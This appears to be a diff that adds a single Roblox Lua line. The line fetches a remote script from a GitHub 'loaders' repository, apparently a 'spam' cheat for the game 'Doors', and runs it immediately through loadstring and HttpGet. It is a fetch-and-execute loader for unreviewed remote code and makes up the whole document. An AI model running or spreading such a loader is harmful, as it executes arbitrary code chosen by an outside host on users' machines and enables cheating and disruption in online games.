@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/doors-spam3-gmk3e3n0l4d1sg.lua"))()
